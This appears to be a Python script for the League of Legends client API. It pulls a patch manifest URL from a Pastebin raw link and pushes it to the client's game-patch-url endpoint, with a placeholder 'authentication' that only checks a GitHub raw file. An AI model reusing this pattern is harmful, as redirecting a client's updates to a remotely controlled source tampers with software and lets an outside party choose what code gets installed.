import requests
from lcu_driver import Connector

def get_patch_url_from_raw_link(raw_link):
    response = requests.get(raw_link)
    if response.status_code == 200:
        patch_url = response.text.strip()
        return patch_url
    else:
        print(f"Failed to fetch patch URL from raw link. Status code: {response.status_code}")
        return None

def authenticate_user():
    # RAW MANIFEST ( RAW ONLY )
    raw_link = "https://raw.githubusercontent.com/V4NDETTA/6649/master/srl"
    patch_url = get_patch_url_from_raw_link(raw_link)
    
    # Add your authentication logic here based on the patch URL
    # For example, check if the patch URL is valid
    
    return patch_url is not None  # Adjust the condition based on your authentication logic

connector = Connector()

async def send_patch_url(connection, patch_url):
    url = f"/lol-patch/v1/game-patch-url?url={patch_url}"
    
    # Make a PUT request
    response = await connection.request('PUT', url)
    
    if response.status == 200:
        print("Patch URL successfully sent.")
    else:
        print(f"Connect: {response.status}")

@connector.ready
async def connect(connection):
    # MANIFEST PATCH ( RAW ONLY )
    raw_link = "https://pastebin.com/raw/kNXq99Yt"
    patch_url = get_patch_url_from_raw_link(raw_link)
    
    if patch_url and authenticate_user():
        await send_patch_url(connection, patch_url)

# Start the connector
connector.start()
# Keep the Command Prompt window open
input("Press Enter to exit...")
